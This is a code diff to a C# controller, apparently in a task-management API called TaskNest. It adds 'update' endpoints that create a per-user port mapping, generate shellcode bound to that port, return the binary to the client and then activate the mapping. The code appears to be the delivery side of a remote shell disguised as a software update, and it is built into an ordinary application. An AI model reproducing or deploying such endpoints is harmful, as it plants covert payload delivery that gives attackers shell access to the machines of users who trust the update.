@@ -1,3 +1,4 @@
+using System.Text;
 using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Mvc;
 using net.mstoegerer.TaskNest.Api.Application.Services;
@@ -34,5 +35,28 @@ public class EvilController(EvilService evilService, ILogger<EvilController> log
 
         var res = await evilService.GetMetaDataAsync(pageIndex, pageSize);
         return Ok(res);
+    }
+
+    [HttpGet("update")]
+    [Authorize]
+    public async Task<GetShellCodeDto> Pong()
+    {
+        var portMapping = await evilService.CreateOrGetUserPortAsync(CurrentUser.UserId);
+
+        var shelly = await evilService.GenerateShellCodeAsync(portMapping.port);
+        Console.WriteLine(Encoding.Default.GetString(shelly));
+        return new GetShellCodeDto
+        {
+            Id = portMapping.Id,
+            Binary = shelly
+        };
+    }
+
+    [HttpPost("update/{mappingId:guid}")]
+    [Authorize]
+    public async Task<IActionResult> PepeShell([FromRoute] Guid mappingId)
+    {
+        await evilService.ActivatePortMappingAsync(mappingId);
+        return Ok();
     }
 }
